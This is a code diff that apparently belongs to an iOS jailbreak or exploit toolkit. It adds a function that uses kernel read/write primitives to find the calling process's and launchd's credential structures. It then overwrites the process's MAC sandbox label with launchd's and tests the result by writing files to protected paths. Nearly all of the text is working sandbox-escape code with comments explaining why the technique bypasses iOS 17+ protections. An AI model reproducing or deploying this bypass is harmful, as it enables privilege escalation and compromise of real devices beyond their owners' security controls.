@@ -236,3 +236,98 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     NSLog(@"[SBX] elevate: SKIPPED (uid=0 write disabled for stability)");
     return -1;
 }
+
+#pragma mark - MAC label swap (most reliable sandbox bypass)
+
+// The sandbox extension patching approach (old sandbox_escape) patches ext_set
+// data in-place. On iOS 17+ this may not take effect because:
+//   - ext_set offsets may differ between builds
+//   - The kernel may cache extension data elsewhere
+//
+// This function takes a different approach: swap our entire MAC label
+// (cr_label in ucred) with launchd's label. launchd is the init process
+// and has NO sandbox restrictions whatsoever. By using launchd's label,
+// we inherit its unrestricted MAC profile.
+//
+// On success, the calling process is completely unrestricted by the sandbox.
+int sandbox_label_swap(uint64_t self_proc) {
+    if (!self_proc) { NSLog(@"[SBX-LBL] self_proc is NULL"); return -1; }
+
+    // Step 1: Find our ucred by scanning proc_ro
+    uint64_t our_proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
+    if (!K(our_proc_ro)) { NSLog(@"[SBX-LBL] our proc_ro invalid"); return -1; }
+
+    uint64_t our_ucred = 0;
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t pac = S(early_kread64(our_proc_ro + off));
+        if (!K(pac)) continue;
+        uint64_t maybe_label = S(early_kread64(pac + OFF_UCRED_CR_LABEL));
+        if (K(maybe_label)) { our_ucred = pac; break; }
+    }
+    if (!K(our_ucred)) { NSLog(@"[SBX-LBL] our ucred not found"); return -1; }
+    uint64_t our_label = S(early_kread64(our_ucred + OFF_UCRED_CR_LABEL));
+    NSLog(@"[SBX-LBL] our ucred=0x%llx our_label=0x%llx", our_ucred, our_label);
+
+    // Step 2: Find launchd's proc → ucred → label
+    uint64_t launchd = proc_find_by_name("launchd");
+    if (!launchd || launchd == (uint64_t)-1) {
+        NSLog(@"[SBX-LBL] proc_find_by_name(launchd) failed, trying pid 1");
+        launchd = proc_find(1);
+        if (!launchd || launchd == (uint64_t)-1) {
+            NSLog(@"[SBX-LBL] could not find launchd at all");
+            return -1;
+        }
+    }
+    NSLog(@"[SBX-LBL] launchd proc=0x%llx", launchd);
+
+    uint64_t launchd_proc_ro = S(early_kread64(launchd + OFF_PROC_PROC_RO));
+    if (!K(launchd_proc_ro)) { NSLog(@"[SBX-LBL] launchd proc_ro invalid"); return -1; }
+
+    uint64_t launchd_ucred = 0;
+    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
+        uint64_t pac = S(early_kread64(launchd_proc_ro + off));
+        if (!K(pac)) continue;
+        uint64_t maybe_label = S(early_kread64(pac + OFF_UCRED_CR_LABEL));
+        if (K(maybe_label)) { launchd_ucred = pac; break; }
+    }
+    if (!K(launchd_ucred)) { NSLog(@"[SBX-LBL] launchd ucred not found"); return -1; }
+    uint64_t launchd_label = S(early_kread64(launchd_ucred + OFF_UCRED_CR_LABEL));
+    NSLog(@"[SBX-LBL] launchd ucred=0x%llx launchd_label=0x%llx", launchd_ucred, launchd_label);
+
+    if (!K(launchd_label)) { NSLog(@"[SBX-LBL] launchd label invalid"); return -1; }
+    if (our_label == launchd_label) {
+        NSLog(@"[SBX-LBL] labels already identical, no swap needed");
+        return 0;
+    }
+
+    // Step 3: Swap our label with launchd's by writing cr_label in our ucred
+    NSLog(@"[SBX-LBL] swapping our cr_label: 0x%llx -> 0x%llx", our_label, launchd_label);
+    early_kwrite64(our_ucred + OFF_UCRED_CR_LABEL, launchd_label);
+
+    // Step 4: Verify the swap worked
+    uint64_t verify_label = S(early_kread64(our_ucred + OFF_UCRED_CR_LABEL));
+    if (verify_label != launchd_label) {
+        NSLog(@"[SBX-LBL] swap verification FAILED (readback=0x%llx)", verify_label);
+        return -1;
+    }
+
+    // Step 5: Functional verification - try writing to a sandboxed path
+    int fd = open("/var/mobile/Library/.sbx_label_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) {
+        close(fd); unlink("/var/mobile/Library/.sbx_label_test");
+        NSLog(@"[SBX-LBL] *** LABEL SWAP SUCCESSFUL - unrestricted filesystem access ***");
+        return 0;
+    }
+
+    // Also try /Library (usually fully blocked)
+    fd = open("/Library/.sbx_label_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (fd >= 0) { close(fd); unlink("/Library/.sbx_label_test"); }
+
+    if (fd >= 0) {
+        NSLog(@"[SBX-LBL] *** LABEL SWAP SUCCESSFUL (write to /Library/ worked) ***");
+        return 0;
+    }
+
+    NSLog(@"[SBX-LBL] label swapped but write still fails (errno=%d) - label may still have restrictions", errno);
+    return -1;
+}
